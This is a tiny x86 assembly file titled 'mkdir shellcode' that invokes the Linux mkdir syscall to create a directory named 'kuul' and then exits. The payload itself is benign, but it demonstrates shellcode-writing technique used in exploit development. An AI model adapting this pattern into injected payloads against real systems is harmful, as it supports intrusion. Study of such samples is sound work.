;---------------------------------

; 
; mk.S - mkdir shellcode 
;

.section .text 
.global main 

main: 
	pushl   $0x0 
	pushl   $0x6C75756B
	movl    $0x1ed, %ecx
	movl    %esp, %ebx
	movb 	$0x27, %al 
	int 	$0x80 
	xorl 	%ebx, %ebx 
	movl 	%ebx, %eax 
	incl 	%eax 
	int 	$0x80 
;---------------------------------